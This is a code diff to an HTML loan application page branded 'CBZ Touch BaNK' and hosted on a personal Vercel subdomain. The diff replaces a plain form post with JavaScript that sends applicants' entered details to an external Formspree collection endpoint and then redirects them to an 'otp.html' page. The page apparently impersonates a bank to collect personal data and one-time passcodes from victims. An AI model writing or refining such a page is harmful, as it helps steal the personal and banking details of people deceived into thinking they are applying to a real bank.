@@ -53,15 +53,9 @@
       <span class="touch">touch</span>
     </div>
 
-    <p class="title">Enter your details to apply</p>
+    <p class="title">Enter your details to apply </p>
 
-    <form action="https://formspree.io/f/xjgqlwen" method="POST">
-      <input type="hidden" name="_subject" value="New Loan Application">
-      <input type="hidden" name="_template" value="table">
-  <input type="hidden" name="_captcha" value="false">
-  <input type="text" name="_honey" style="display:none">
-  <input type="hidden" name="_autoresponse" value="We got your application">
-      <input type="hidden" name="_next" value="https://cbz-touch-loan-applyvercel-aaucw93yb-kendrain-devs-projects.vercel.app/otp.html">
+    <form id="loanForm">
 
       <div class="input-group">
         <input type="text" id="name" name="name" placeholder=" " required>
@@ -97,8 +91,36 @@
 
       <button type="submit" class="btn">Submit</button>
     </form>
-
-    <p class="note">@ CBZ Touch BaNK Holdings 2025</p>
-  </div>
-  </body>
+    
+<script>
+document.getElementById('loanForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  
+  const btn = e.target.querySelector('.btn');
+  btn.textContent = 'Sending...';
+  btn.disabled = true;
+  
+  const formData = new FormData(e.target);
+  formData.append('_subject', 'New Loan Application');
+  formData.append('_template', 'table');
+  formData.append('_captcha', 'false');
+  
+  try {
+    await fetch('https://formspree.io/f/xjgqlwen', {
+      method: 'POST',
+      body: formData,
+      headers: { 'Accept': 'application/json' }
+    });
+    
+    // This runs AFTER Formspree gets the data
+    window.location.href = '/otp.html';
+    
+  } catch (error) {
+    alert('Error. Try again.');
+    btn.textContent = 'Submit';
+    btn.disabled = false;
+  }
+  });
+  </script>
+</body>
 </html>
